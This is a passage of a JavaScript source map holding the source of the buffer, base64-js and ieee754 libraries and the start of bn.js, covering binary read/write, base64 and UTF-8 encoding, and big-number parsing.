this[offset + 1] = (value >>> 8)\n  return offset + 2\n}\n\nBuffer.prototype.writeUint16BE =\nBuffer.prototype.writeUInt16BE = function writeUInt16BE (value, offset, noAssert) {\n  value = +value\n  offset = offset >>> 0\n  if (!noAssert) checkInt(this, value, offset, 2, 0xffff, 0)\n  this[offset] = (value >>> 8)\n  this[offset + 1] = (value & 0xff)\n  return offset + 2\n}\n\nBuffer.prototype.writeUint32LE =\nBuffer.prototype.writeUInt32LE = function writeUInt32LE (value, offset, noAssert) {\n  value = +value\n  offset = offset >>> 0\n  if (!noAssert) checkInt(this, value, offset, 4, 0xffffffff, 0)\n  this[offset + 3] = (value >>> 24)\n  this[offset + 2] = (value >>> 16)\n  this[offset + 1] = (value >>> 8)\n  this[offset] = (value & 0xff)\n  return offset + 4\n}\n\nBuffer.prototype.writeUint32BE =\nBuffer.prototype.writeUInt32BE = function writeUInt32BE (value, offset, noAssert) {\n  value = +value\n  offset = offset >>> 0\n  if (!noAssert) checkInt(this, value, offset, 4, 0xffffffff, 0)\n  this[offset] = (value >>> 24)\n  this[offset + 1] = (value >>> 16)\n  this[offset + 2] = (value >>> 8)\n  this[offset + 3] = (value & 0xff)\n  return offset + 4\n}\n\nfunction wrtBigUInt64LE (buf, value, offset, min, max) {\n  checkIntBI(value, min, max, buf, offset, 7)\n\n  let lo = Number(value & BigInt(0xffffffff))\n  buf[offset++] = lo\n  lo = lo >> 8\n  buf[offset++] = lo\n  lo = lo >> 8\n  buf[offset++] = lo\n  lo = lo >> 8\n  buf[offset++] = lo\n  let hi = Number(value >> BigInt(32) & BigInt(0xffffffff))\n  buf[offset++] = hi\n  hi = hi >> 8\n  buf[offset++] = hi\n  hi = hi >> 8\n  buf[offset++] = hi\n  hi = hi >> 8\n  buf[offset++] = hi\n  return offset\n}\n\nfunction wrtBigUInt64BE (buf, value, offset, min, max) {\n  checkIntBI(value, min, max, buf, offset, 7)\n\n  let lo = Number(value & BigInt(0xffffffff))\n  buf[offset + 7] = lo\n  lo = lo >> 8\n  buf[offset + 6] = lo\n  lo = lo >> 8\n  buf[offset + 5] = lo\n  lo = lo >> 8\n  buf[offset + 4] = lo\n  let hi = Number(value >> BigInt(32) & BigInt(0xffffffff))\n  buf[offset + 3] = hi\n  hi = hi >> 8\n  buf[offset + 2] = hi\n  hi = hi >> 8\n  buf[offset + 1] = hi\n  hi = hi >> 8\n  buf[offset] = hi\n  return offset + 8\n}\n\nBuffer.prototype.writeBigUInt64LE = defineBigIntMethod(function writeBigUInt64LE (value, offset = 0) {\n  return wrtBigUInt64LE(this, value, offset, BigInt(0), BigInt('0xffffffffffffffff'))\n})\n\nBuffer.prototype.writeBigUInt64BE = defineBigIntMethod(function writeBigUInt64BE (value, offset = 0) {\n  return wrtBigUInt64BE(this, value, offset, BigInt(0), BigInt('0xffffffffffffffff'))\n})\n\nBuffer.prototype.writeIntLE = function writeIntLE (value, offset, byteLength, noAssert) {\n  value = +value\n  offset = offset >>> 0\n  if (!noAssert) {\n    const limit = Math.pow(2, (8 * byteLength) - 1)\n\n    checkInt(this, value, offset, byteLength, limit - 1, -limit)\n  }\n\n  let i = 0\n  let mul = 1\n  let sub = 0\n  this[offset] = value & 0xFF\n  while (++i < byteLength && (mul *= 0x100)) {\n    if (value < 0 && sub === 0 && this[offset + i - 1] !== 0) {\n      sub = 1\n    }\n    this[offset + i] = ((value / mul) >> 0) - sub & 0xFF\n  }\n\n  return offset + byteLength\n}\n\nBuffer.prototype.writeIntBE = function writeIntBE (value, offset, byteLength, noAssert) {\n  value = +value\n  offset = offset >>> 0\n  if (!noAssert) {\n    const limit = Math.pow(2, (8 * byteLength) - 1)\n\n    checkInt(this, value, offset, byteLength, limit - 1, -limit)\n  }\n\n  let i = byteLength - 1\n  let mul = 1\n  let sub = 0\n  this[offset + i] = value & 0xFF\n  while (--i >= 0 && (mul *= 0x100)) {\n    if (value < 0 && sub === 0 && this[offset + i + 1] !== 0) {\n      sub = 1\n    }\n    this[offset + i] = ((value / mul) >> 0) - sub & 0xFF\n  }\n\n  return offset + byteLength\n}\n\nBuffer.prototype.writeInt8 = function writeInt8 (value, offset, noAssert) {\n  value = +value\n  offset = offset >>> 0\n  if (!noAssert) checkInt(this, value, offset, 1, 0x7f, -0x80)\n  if (value < 0) value = 0xff + value + 1\n  this[offset] = (value & 0xff)\n  return offset + 1\n}\n\nBuffer.prototype.writeInt16LE = function writeInt16LE (value, offset, noAssert) {\n  value = +value\n  offset = offset >>> 0\n  if (!noAssert) checkInt(this, value, offset, 2, 0x7fff, -0x8000)\n  this[offset] = (value & 0xff)\n  this[offset + 1] = (value >>> 8)\n  return offset + 2\n}\n\nBuffer.prototype.writeInt16BE = function writeInt16BE (value, offset, noAssert) {\n  value = +value\n  offset = offset >>> 0\n  if (!noAssert) checkInt(this, value, offset, 2, 0x7fff, -0x8000)\n  this[offset] = (value >>> 8)\n  this[offset + 1] = (value & 0xff)\n  return offset + 2\n}\n\nBuffer.prototype.writeInt32LE = function writeInt32LE (value, offset, noAssert) {\n  value = +value\n  offset = offset >>> 0\n  if (!noAssert) checkInt(this, value, offset, 4, 0x7fffffff, -0x80000000)\n  this[offset] = (value & 0xff)\n  this[offset + 1] = (value >>> 8)\n  this[offset + 2] = (value >>> 16)\n  this[offset + 3] = (value >>> 24)\n  return offset + 4\n}\n\nBuffer.prototype.writeInt32BE = function writeInt32BE (value, offset, noAssert) {\n  value = +value\n  offset = offset >>> 0\n  if (!noAssert) checkInt(this, value, offset, 4, 0x7fffffff, -0x80000000)\n  if (value < 0) value = 0xffffffff + value + 1\n  this[offset] = (value >>> 24)\n  this[offset + 1] = (value >>> 16)\n  this[offset + 2] = (value >>> 8)\n  this[offset + 3] = (value & 0xff)\n  return offset + 4\n}\n\nBuffer.prototype.writeBigInt64LE = defineBigIntMethod(function writeBigInt64LE (value, offset = 0) {\n  return wrtBigUInt64LE(this, value, offset, -BigInt('0x8000000000000000'), BigInt('0x7fffffffffffffff'))\n})\n\nBuffer.prototype.writeBigInt64BE = defineBigIntMethod(function writeBigInt64BE (value, offset = 0) {\n  return wrtBigUInt64BE(this, value, offset, -BigInt('0x8000000000000000'), BigInt('0x7fffffffffffffff'))\n})\n\nfunction checkIEEE754 (buf, value, offset, ext, max, min) {\n  if (offset + ext > buf.length) throw new RangeError('Index out of range')\n  if (offset < 0) throw new RangeError('Index out of range')\n}\n\nfunction writeFloat (buf, value, offset, littleEndian, noAssert) {\n  value = +value\n  offset = offset >>> 0\n  if (!noAssert) {\n    checkIEEE754(buf, value, offset, 4, 3.4028234663852886e+38, -3.4028234663852886e+38)\n  }\n  ieee754.write(buf, value, offset, littleEndian, 23, 4)\n  return offset + 4\n}\n\nBuffer.prototype.writeFloatLE = function writeFloatLE (value, offset, noAssert) {\n  return writeFloat(this, value, offset, true, noAssert)\n}\n\nBuffer.prototype.writeFloatBE = function writeFloatBE (value, offset, noAssert) {\n  return writeFloat(this, value, offset, false, noAssert)\n}\n\nfunction writeDouble (buf, value, offset, littleEndian, noAssert) {\n  value = +value\n  offset = offset >>> 0\n  if (!noAssert) {\n    checkIEEE754(buf, value, offset, 8, 1.7976931348623157E+308, -1.7976931348623157E+308)\n  }\n  ieee754.write(buf, value, offset, littleEndian, 52, 8)\n  return offset + 8\n}\n\nBuffer.prototype.writeDoubleLE = function writeDoubleLE (value, offset, noAssert) {\n  return writeDouble(this, value, offset, true, noAssert)\n}\n\nBuffer.prototype.writeDoubleBE = function writeDoubleBE (value, offset, noAssert) {\n  return writeDouble(this, value, offset, false, noAssert)\n}\n\n// copy(targetBuffer, targetStart=0, sourceStart=0, sourceEnd=buffer.length)\nBuffer.prototype.copy = function copy (target, targetStart, start, end) {\n  if (!Buffer.isBuffer(target)) throw new TypeError('argument should be a Buffer')\n  if (!start) start = 0\n  if (!end && end !== 0) end = this.length\n  if (targetStart >= target.length) targetStart = target.length\n  if (!targetStart) targetStart = 0\n  if (end > 0 && end < start) end = start\n\n  // Copy 0 bytes; we're done\n  if (end === start) return 0\n  if (target.length === 0 || this.length === 0) return 0\n\n  // Fatal error conditions\n  if (targetStart < 0) {\n    throw new RangeError('targetStart out of bounds')\n  }\n  if (start < 0 || start >= this.length) throw new RangeError('Index out of range')\n  if (end < 0) throw new RangeError('sourceEnd out of bounds')\n\n  // Are we oob?\n  if (end > this.length) end = this.length\n  if (target.length - targetStart < end - start) {\n    end = target.length - targetStart + start\n  }\n\n  const len = end - start\n\n  if (this === target && typeof Uint8Array.prototype.copyWithin === 'function') {\n    // Use built-in when available, missing from IE11\n    this.copyWithin(targetStart, start, end)\n  } else {\n    Uint8Array.prototype.set.call(\n      target,\n      this.subarray(start, end),\n      targetStart\n    )\n  }\n\n  return len\n}\n\n// Usage:\n//    buffer.fill(number[, offset[, end]])\n//    buffer.fill(buffer[, offset[, end]])\n//    buffer.fill(string[, offset[, end]][, encoding])\nBuffer.prototype.fill = function fill (val, start, end, encoding) {\n  // Handle string cases:\n  if (typeof val === 'string') {\n    if (typeof start === 'string') {\n      encoding = start\n      start = 0\n      end = this.length\n    } else if (typeof end === 'string') {\n      encoding = end\n      end = this.length\n    }\n    if (encoding !== undefined && typeof encoding !== 'string') {\n      throw new TypeError('encoding must be a string')\n    }\n    if (typeof encoding === 'string' && !Buffer.isEncoding(encoding)) {\n      throw new TypeError('Unknown encoding: ' + encoding)\n    }\n    if (val.length === 1) {\n      const code = val.charCodeAt(0)\n      if ((encoding === 'utf8' && code < 128) ||\n          encoding === 'latin1') {\n        // Fast path: If `val` fits into a single byte, use that numeric value.\n        val = code\n      }\n    }\n  } else if (typeof val === 'number') {\n    val = val & 255\n  } else if (typeof val === 'boolean') {\n    val = Number(val)\n  }\n\n  // Invalid ranges are not set to a default, so can range check early.\n  if (start < 0 || this.length < start || this.length < end) {\n    throw new RangeError('Out of range index')\n  }\n\n  if (end <= start) {\n    return this\n  }\n\n  start = start >>> 0\n  end = end === undefined ? this.length : end >>> 0\n\n  if (!val) val = 0\n\n  let i\n  if (typeof val === 'number') {\n    for (i = start; i < end; ++i) {\n      this[i] = val\n    }\n  } else {\n    const bytes = Buffer.isBuffer(val)\n      ? val\n      : Buffer.from(val, encoding)\n    const len = bytes.length\n    if (len === 0) {\n      throw new TypeError('The value \"' + val +\n        '\" is invalid for argument \"value\"')\n    }\n    for (i = 0; i < end - start; ++i) {\n      this[i + start] = bytes[i % len]\n    }\n  }\n\n  return this\n}\n\n// CUSTOM ERRORS\n// =============\n\n// Simplified versions from Node, changed for Buffer-only usage\nconst errors = {}\nfunction E (sym, getMessage, Base) {\n  errors[sym] = class NodeError extends Base {\n    constructor () {\n      super()\n\n      Object.defineProperty(this, 'message', {\n        value: getMessage.apply(this, arguments),\n        writable: true,\n        configurable: true\n      })\n\n      // Add the error code to the name to include it in the stack trace.\n      this.name = `${this.name} [${sym}]`\n      // Access the stack to generate the error message including the error code\n      // from the name.\n      this.stack // eslint-disable-line no-unused-expressions\n      // Reset the name to the actual name.\n      delete this.name\n    }\n\n    get code () {\n      return sym\n    }\n\n    set code (value) {\n      Object.defineProperty(this, 'code', {\n        configurable: true,\n        enumerable: true,\n        value,\n        writable: true\n      })\n    }\n\n    toString () {\n      return `${this.name} [${sym}]: ${this.message}`\n    }\n  }\n}\n\nE('ERR_BUFFER_OUT_OF_BOUNDS',\n  function (name) {\n    if (name) {\n      return `${name} is outside of buffer bounds`\n    }\n\n    return 'Attempt to access memory outside buffer bounds'\n  }, RangeError)\nE('ERR_INVALID_ARG_TYPE',\n  function (name, actual) {\n    return `The \"${name}\" argument must be of type number. Received type ${typeof actual}`\n  }, TypeError)\nE('ERR_OUT_OF_RANGE',\n  function (str, range, input) {\n    let msg = `The value of \"${str}\" is out of range.`\n    let received = input\n    if (Number.isInteger(input) && Math.abs(input) > 2 ** 32) {\n      received = addNumericalSeparator(String(input))\n    } else if (typeof input === 'bigint') {\n      received = String(input)\n      if (input > BigInt(2) ** BigInt(32) || input < -(BigInt(2) ** BigInt(32))) {\n        received = addNumericalSeparator(received)\n      }\n      received += 'n'\n    }\n    msg += ` It must be ${range}. Received ${received}`\n    return msg\n  }, RangeError)\n\nfunction addNumericalSeparator (val) {\n  let res = ''\n  let i = val.length\n  const start = val[0] === '-' ? 1 : 0\n  for (; i >= start + 4; i -= 3) {\n    res = `_${val.slice(i - 3, i)}${res}`\n  }\n  return `${val.slice(0, i)}${res}`\n}\n\n// CHECK FUNCTIONS\n// ===============\n\nfunction checkBounds (buf, offset, byteLength) {\n  validateNumber(offset, 'offset')\n  if (buf[offset] === undefined || buf[offset + byteLength] === undefined) {\n    boundsError(offset, buf.length - (byteLength + 1))\n  }\n}\n\nfunction checkIntBI (value, min, max, buf, offset, byteLength) {\n  if (value > max || value < min) {\n    const n = typeof min === 'bigint' ? 'n' : ''\n    let range\n    if (byteLength > 3) {\n      if (min === 0 || min === BigInt(0)) {\n        range = `>= 0${n} and < 2${n} ** ${(byteLength + 1) * 8}${n}`\n      } else {\n        range = `>= -(2${n} ** ${(byteLength + 1) * 8 - 1}${n}) and < 2 ** ` +\n                `${(byteLength + 1) * 8 - 1}${n}`\n      }\n    } else {\n      range = `>= ${min}${n} and <= ${max}${n}`\n    }\n    throw new errors.ERR_OUT_OF_RANGE('value', range, value)\n  }\n  checkBounds(buf, offset, byteLength)\n}\n\nfunction validateNumber (value, name) {\n  if (typeof value !== 'number') {\n    throw new errors.ERR_INVALID_ARG_TYPE(name, 'number', value)\n  }\n}\n\nfunction boundsError (value, length, type) {\n  if (Math.floor(value) !== value) {\n    validateNumber(value, type)\n    throw new errors.ERR_OUT_OF_RANGE(type || 'offset', 'an integer', value)\n  }\n\n  if (length < 0) {\n    throw new errors.ERR_BUFFER_OUT_OF_BOUNDS()\n  }\n\n  throw new errors.ERR_OUT_OF_RANGE(type || 'offset',\n                                    `>= ${type ? 1 : 0} and <= ${length}`,\n                                    value)\n}\n\n// HELPER FUNCTIONS\n// ================\n\nconst INVALID_BASE64_RE = /[^+/0-9A-Za-z-_]/g\n\nfunction base64clean (str) {\n  // Node takes equal signs as end of the Base64 encoding\n  str = str.split('=')[0]\n  // Node strips out invalid characters like \\n and \\t from the string, base64-js does not\n  str = str.trim().replace(INVALID_BASE64_RE, '')\n  // Node converts strings with length < 2 to ''\n  if (str.length < 2) return ''\n  // Node allows for non-padded base64 strings (missing trailing ===), base64-js does not\n  while (str.length % 4 !== 0) {\n    str = str + '='\n  }\n  return str\n}\n\nfunction utf8ToBytes (string, units) {\n  units = units || Infinity\n  let codePoint\n  const length = string.length\n  let leadSurrogate = null\n  const bytes = []\n\n  for (let i = 0; i < length; ++i) {\n    codePoint = string.charCodeAt(i)\n\n    // is surrogate component\n    if (codePoint > 0xD7FF && codePoint < 0xE000) {\n      // last char was a lead\n      if (!leadSurrogate) {\n        // no lead yet\n        if (codePoint > 0xDBFF) {\n          // unexpected trail\n          if ((units -= 3) > -1) bytes.push(0xEF, 0xBF, 0xBD)\n          continue\n        } else if (i + 1 === length) {\n          // unpaired lead\n          if ((units -= 3) > -1) bytes.push(0xEF, 0xBF, 0xBD)\n          continue\n        }\n\n        // valid lead\n        leadSurrogate = codePoint\n\n        continue\n      }\n\n      // 2 leads in a row\n      if (codePoint < 0xDC00) {\n        if ((units -= 3) > -1) bytes.push(0xEF, 0xBF, 0xBD)\n        leadSurrogate = codePoint\n        continue\n      }\n\n      // valid surrogate pair\n      codePoint = (leadSurrogate - 0xD800 << 10 | codePoint - 0xDC00) + 0x10000\n    } else if (leadSurrogate) {\n      // valid bmp char, but last char was a lead\n      if ((units -= 3) > -1) bytes.push(0xEF, 0xBF, 0xBD)\n    }\n\n    leadSurrogate = null\n\n    // encode utf8\n    if (codePoint < 0x80) {\n      if ((units -= 1) < 0) break\n      bytes.push(codePoint)\n    } else if (codePoint < 0x800) {\n      if ((units -= 2) < 0) break\n      bytes.push(\n        codePoint >> 0x6 | 0xC0,\n        codePoint & 0x3F | 0x80\n      )\n    } else if (codePoint < 0x10000) {\n      if ((units -= 3) < 0) break\n      bytes.push(\n        codePoint >> 0xC | 0xE0,\n        codePoint >> 0x6 & 0x3F | 0x80,\n        codePoint & 0x3F | 0x80\n      )\n    } else if (codePoint < 0x110000) {\n      if ((units -= 4) < 0) break\n      bytes.push(\n        codePoint >> 0x12 | 0xF0,\n        codePoint >> 0xC & 0x3F | 0x80,\n        codePoint >> 0x6 & 0x3F | 0x80,\n        codePoint & 0x3F | 0x80\n      )\n    } else {\n      throw new Error('Invalid code point')\n    }\n  }\n\n  return bytes\n}\n\nfunction asciiToBytes (str) {\n  const byteArray = []\n  for (let i = 0; i < str.length; ++i) {\n    // Node's code seems to be doing this and not & 0x7F..\n    byteArray.push(str.charCodeAt(i) & 0xFF)\n  }\n  return byteArray\n}\n\nfunction utf16leToBytes (str, units) {\n  let c, hi, lo\n  const byteArray = []\n  for (let i = 0; i < str.length; ++i) {\n    if ((units -= 2) < 0) break\n\n    c = str.charCodeAt(i)\n    hi = c >> 8\n    lo = c % 256\n    byteArray.push(lo)\n    byteArray.push(hi)\n  }\n\n  return byteArray\n}\n\nfunction base64ToBytes (str) {\n  return base64.toByteArray(base64clean(str))\n}\n\nfunction blitBuffer (src, dst, offset, length) {\n  let i\n  for (i = 0; i < length; ++i) {\n    if ((i + offset >= dst.length) || (i >= src.length)) break\n    dst[i + offset] = src[i]\n  }\n  return i\n}\n\n// ArrayBuffer or Uint8Array objects from other contexts (i.e. iframes) do not pass\n// the `instanceof` check but they should be treated as of that type.\n// See: https://github.com/feross/buffer/issues/166\nfunction isInstance (obj, type) {\n  return obj instanceof type ||\n    (obj != null && obj.constructor != null && obj.constructor.name != null &&\n      obj.constructor.name === type.name)\n}\nfunction numberIsNaN (obj) {\n  // For IE11 support\n  return obj !== obj // eslint-disable-line no-self-compare\n}\n\n// Create lookup table for `toString('hex')`\n// See: https://github.com/feross/buffer/issues/219\nconst hexSliceLookupTable = (function () {\n  const alphabet = '0123456789abcdef'\n  const table = new Array(256)\n  for (let i = 0; i < 16; ++i) {\n    const i16 = i * 16\n    for (let j = 0; j < 16; ++j) {\n      table[i16 + j] = alphabet[i] + alphabet[j]\n    }\n  }\n  return table\n})()\n\n// Return not function with Error if BigInt not supported\nfunction defineBigIntMethod (fn) {\n  return typeof BigInt === 'undefined' ? BufferBigIntNotDefined : fn\n}\n\nfunction BufferBigIntNotDefined () {\n  throw new Error('BigInt not supported')\n}\n","'use strict'\n\nexports.byteLength = byteLength\nexports.toByteArray = toByteArray\nexports.fromByteArray = fromByteArray\n\nvar lookup = []\nvar revLookup = []\nvar Arr = typeof Uint8Array !== 'undefined' ? Uint8Array : Array\n\nvar code = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\nfor (var i = 0, len = code.length; i < len; ++i) {\n  lookup[i] = code[i]\n  revLookup[code.charCodeAt(i)] = i\n}\n\n// Support decoding URL-safe base64 strings, as Node.js does.\n// See: https://en.wikipedia.org/wiki/Base64#URL_applications\nrevLookup['-'.charCodeAt(0)] = 62\nrevLookup['_'.charCodeAt(0)] = 63\n\nfunction getLens (b64) {\n  var len = b64.length\n\n  if (len % 4 > 0) {\n    throw new Error('Invalid string. Length must be a multiple of 4')\n  }\n\n  // Trim off extra bytes after placeholder bytes are found\n  // See: https://github.com/beatgammit/base64-js/issues/42\n  var validLen = b64.indexOf('=')\n  if (validLen === -1) validLen = len\n\n  var placeHoldersLen = validLen === len\n    ? 0\n    : 4 - (validLen % 4)\n\n  return [validLen, placeHoldersLen]\n}\n\n// base64 is 4/3 + up to two characters of the original data\nfunction byteLength (b64) {\n  var lens = getLens(b64)\n  var validLen = lens[0]\n  var placeHoldersLen = lens[1]\n  return ((validLen + placeHoldersLen) * 3 / 4) - placeHoldersLen\n}\n\nfunction _byteLength (b64, validLen, placeHoldersLen) {\n  return ((validLen + placeHoldersLen) * 3 / 4) - placeHoldersLen\n}\n\nfunction toByteArray (b64) {\n  var tmp\n  var lens = getLens(b64)\n  var validLen = lens[0]\n  var placeHoldersLen = lens[1]\n\n  var arr = new Arr(_byteLength(b64, validLen, placeHoldersLen))\n\n  var curByte = 0\n\n  // if there are placeholders, only get up to the last complete 4 chars\n  var len = placeHoldersLen > 0\n    ? validLen - 4\n    : validLen\n\n  var i\n  for (i = 0; i < len; i += 4) {\n    tmp =\n      (revLookup[b64.charCodeAt(i)] << 18) |\n      (revLookup[b64.charCodeAt(i + 1)] << 12) |\n      (revLookup[b64.charCodeAt(i + 2)] << 6) |\n      revLookup[b64.charCodeAt(i + 3)]\n    arr[curByte++] = (tmp >> 16) & 0xFF\n    arr[curByte++] = (tmp >> 8) & 0xFF\n    arr[curByte++] = tmp & 0xFF\n  }\n\n  if (placeHoldersLen === 2) {\n    tmp =\n      (revLookup[b64.charCodeAt(i)] << 2) |\n      (revLookup[b64.charCodeAt(i + 1)] >> 4)\n    arr[curByte++] = tmp & 0xFF\n  }\n\n  if (placeHoldersLen === 1) {\n    tmp =\n      (revLookup[b64.charCodeAt(i)] << 10) |\n      (revLookup[b64.charCodeAt(i + 1)] << 4) |\n      (revLookup[b64.charCodeAt(i + 2)] >> 2)\n    arr[curByte++] = (tmp >> 8) & 0xFF\n    arr[curByte++] = tmp & 0xFF\n  }\n\n  return arr\n}\n\nfunction tripletToBase64 (num) {\n  return lookup[num >> 18 & 0x3F] +\n    lookup[num >> 12 & 0x3F] +\n    lookup[num >> 6 & 0x3F] +\n    lookup[num & 0x3F]\n}\n\nfunction encodeChunk (uint8, start, end) {\n  var tmp\n  var output = []\n  for (var i = start; i < end; i += 3) {\n    tmp =\n      ((uint8[i] << 16) & 0xFF0000) +\n      ((uint8[i + 1] << 8) & 0xFF00) +\n      (uint8[i + 2] & 0xFF)\n    output.push(tripletToBase64(tmp))\n  }\n  return output.join('')\n}\n\nfunction fromByteArray (uint8) {\n  var tmp\n  var len = uint8.length\n  var extraBytes = len % 3 // if we have 1 byte left, pad 2 bytes\n  var parts = []\n  var maxChunkLength = 16383 // must be multiple of 3\n\n  // go through the array every three bytes, we'll deal with trailing stuff later\n  for (var i = 0, len2 = len - extraBytes; i < len2; i += maxChunkLength) {\n    parts.push(encodeChunk(uint8, i, (i + maxChunkLength) > len2 ? len2 : (i + maxChunkLength)))\n  }\n\n  // pad the end with zeros, but make sure to not forget the extra bytes\n  if (extraBytes === 1) {\n    tmp = uint8[len - 1]\n    parts.push(\n      lookup[tmp >> 2] +\n      lookup[(tmp << 4) & 0x3F] +\n      '=='\n    )\n  } else if (extraBytes === 2) {\n    tmp = (uint8[len - 2] << 8) + uint8[len - 1]\n    parts.push(\n      lookup[tmp >> 10] +\n      lookup[(tmp >> 4) & 0x3F] +\n      lookup[(tmp << 2) & 0x3F] +\n      '='\n    )\n  }\n\n  return parts.join('')\n}\n","/*! ieee754. BSD-3-Clause License. Feross Aboukhadijeh <https://feross.org/opensource> */\nexports.read = function (buffer, offset, isLE, mLen, nBytes) {\n  var e, m\n  var eLen = (nBytes * 8) - mLen - 1\n  var eMax = (1 << eLen) - 1\n  var eBias = eMax >> 1\n  var nBits = -7\n  var i = isLE ? (nBytes - 1) : 0\n  var d = isLE ? -1 : 1\n  var s = buffer[offset + i]\n\n  i += d\n\n  e = s & ((1 << (-nBits)) - 1)\n  s >>= (-nBits)\n  nBits += eLen\n  for (; nBits > 0; e = (e * 256) + buffer[offset + i], i += d, nBits -= 8) {}\n\n  m = e & ((1 << (-nBits)) - 1)\n  e >>= (-nBits)\n  nBits += mLen\n  for (; nBits > 0; m = (m * 256) + buffer[offset + i], i += d, nBits -= 8) {}\n\n  if (e === 0) {\n    e = 1 - eBias\n  } else if (e === eMax) {\n    return m ? NaN : ((s ? -1 : 1) * Infinity)\n  } else {\n    m = m + Math.pow(2, mLen)\n    e = e - eBias\n  }\n  return (s ? -1 : 1) * m * Math.pow(2, e - mLen)\n}\n\nexports.write = function (buffer, value, offset, isLE, mLen, nBytes) {\n  var e, m, c\n  var eLen = (nBytes * 8) - mLen - 1\n  var eMax = (1 << eLen) - 1\n  var eBias = eMax >> 1\n  var rt = (mLen === 23 ? Math.pow(2, -24) - Math.pow(2, -77) : 0)\n  var i = isLE ? 0 : (nBytes - 1)\n  var d = isLE ? 1 : -1\n  var s = value < 0 || (value === 0 && 1 / value < 0) ? 1 : 0\n\n  value = Math.abs(value)\n\n  if (isNaN(value) || value === Infinity) {\n    m = isNaN(value) ? 1 : 0\n    e = eMax\n  } else {\n    e = Math.floor(Math.log(value) / Math.LN2)\n    if (value * (c = Math.pow(2, -e)) < 1) {\n      e--\n      c *= 2\n    }\n    if (e + eBias >= 1) {\n      value += rt / c\n    } else {\n      value += rt * Math.pow(2, 1 - eBias)\n    }\n    if (value * c >= 2) {\n      e++\n      c /= 2\n    }\n\n    if (e + eBias >= eMax) {\n      m = 0\n      e = eMax\n    } else if (e + eBias >= 1) {\n      m = ((value * c) - 1) * Math.pow(2, mLen)\n      e = e + eBias\n    } else {\n      m = value * Math.pow(2, eBias - 1) * Math.pow(2, mLen)\n      e = 0\n    }\n  }\n\n  for (; mLen >= 8; buffer[offset + i] = m & 0xff, i += d, m /= 256, mLen -= 8) {}\n\n  e = (e << mLen) | m\n  eLen += mLen\n  for (; eLen > 0; buffer[offset + i] = e & 0xff, i += d, e /= 256, eLen -= 8) {}\n\n  buffer[offset + i - d] |= s * 128\n}\n",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,"(function (module, exports) {\n  'use strict';\n\n  // Utils\n  function assert (val, msg) {\n    if (!val) throw new Error(msg || 'Assertion failed');\n  }\n\n  // Could use `inherits` module, but don't want to move from single file\n  // architecture yet.\n  function inherits (ctor, superCtor) {\n    ctor.super_ = superCtor;\n    var TempCtor = function () {};\n    TempCtor.prototype = superCtor.prototype;\n    ctor.prototype = new TempCtor();\n    ctor.prototype.constructor = ctor;\n  }\n\n  // BN\n\n  function BN (number, base, endian) {\n    if (BN.isBN(number)) {\n      return number;\n    }\n\n    this.negative = 0;\n    this.words = null;\n    this.length = 0;\n\n    // Reduction context\n    this.red = null;\n\n    if (number !== null) {\n      if (base === 'le' || base === 'be') {\n        endian = base;\n        base = 10;\n      }\n\n      this._init(number || 0, base || 10, endian || 'be');\n    }\n  }\n  if (typeof module === 'object') {\n    module.exports = BN;\n  } else {\n    exports.BN = BN;\n  }\n\n  BN.BN = BN;\n  BN.wordSize = 26;\n\n  var Buffer;\n  try {\n    if (typeof window !== 'undefined' && typeof window.Buffer !== 'undefined') {\n      Buffer = window.Buffer;\n    } else {\n      Buffer = require('buffer').Buffer;\n    }\n  } catch (e) {\n  }\n\n  BN.isBN = function isBN (num) {\n    if (num instanceof BN) {\n      return true;\n    }\n\n    return num !== null && typeof num === 'object' &&\n      num.constructor.wordSize === BN.wordSize && Array.isArray(num.words);\n  };\n\n  BN.max = function max (left, right) {\n    if (left.cmp(right) > 0) return left;\n    return right;\n  };\n\n  BN.min = function min (left, right) {\n    if (left.cmp(right) < 0) return left;\n    return right;\n  };\n\n  BN.prototype._init = function init (number, base, endian) {\n    if (typeof number === 'number') {\n      return this._initNumber(number, base, endian);\n    }\n\n    if (typeof number === 'object') {\n      return this._initArray(number, base, endian);\n    }\n\n    if (base === 'hex') {\n      base = 16;\n    }\n    assert(base === (base | 0) && base >= 2 && base <= 36);\n\n    number = number.toString().replace(/\\s+/g, '');\n    var start = 0;\n    if (number[0] === '-') {\n      start++;\n      this.negative = 1;\n    }\n\n    if (start < number.length) {\n      if (base === 16) {\n        this._parseHex(number, start, endian);\n      } else {\n        this._parseBase(number, base, start);\n        if (endian === 'le') {\n          this._initArray(this.toArray(), base, endian);\n        }\n      }\n    }\n  };\n\n  BN.prototype._initNumber = function _initNumber (number, base, endian) {\n    if (number < 0) {\n      this.negative = 1;\n      number = -number;\n    }\n    if (number < 0x4000000) {\n      this.words = [number & 0x3ffffff];\n      this.length = 1;\n    } else if (number < 0x10000000000000) {\n      this.words = [\n        number & 0x3ffffff,\n        (number / 0x4000000) & 0x3ffffff\n      ];\n      this.length = 2;\n    } else {\n      assert(number < 0x20000000000000); // 2 ^ 53 (unsafe)\n      this.words = [\n        number & 0x3ffffff,\n        (number / 0x4000000) & 0x3ffffff,\n        1\n      ];\n      this.length = 3;\n    }\n\n    if (endian !== 'le') return;\n\n    // Reverse the bytes\n    this._initArray(this.toArray(), base, endian);\n  };\n\n  BN.prototype._initArray = function _initArray (number, base, endian) {\n    // Perhaps a Uint8Array\n    assert(typeof number.length === 'number');\n    if (number.length <= 0) {\n      this.words = [0];\n      this.length = 1;\n      return this;\n    }\n\n    this.length = Math.ceil(number.length / 3);\n    this.words = new Array(this.length);\n    for (var i = 0; i < this.length; i++) {\n      this.words[i] = 0;\n    }\n\n    var j, w;\n    var off = 0;\n    if (endian === 'be') {\n      for (i = number.length - 1, j = 0; i >= 0; i -= 3) {\n        w = number[i] | (number[i - 1] << 8) | (number[i - 2] << 16);\n        this.words[j] |= (w << off) & 0x3ffffff;\n        this.words[j + 1] = (w >>> (26 - off)) & 0x3ffffff;\n        off += 24;\n        if (off >= 26) {\n          off -= 26;\n          j++;\n        }\n      }\n    } else if (endian === 'le') {\n      for (i = 0, j = 0; i < number.length; i += 3) {\n        w = number[i] | (number[i + 1] << 8) | (number[i + 2] << 16);\n        this.words[j] |= (w << off) & 0x3ffffff;\n        this.words[j + 1] = (w >>> (26 - off)) & 0x3ffffff;\n        off += 24;\n        if (off >= 26) {\n          off -= 26;\n          j++;\n        }\n      }\n    }\n    return this._strip();\n  };\n\n  function parseHex4Bits (string, index) {\n    var c = string.charCodeAt(index);\n    // '0' - '9'\n    if (c >= 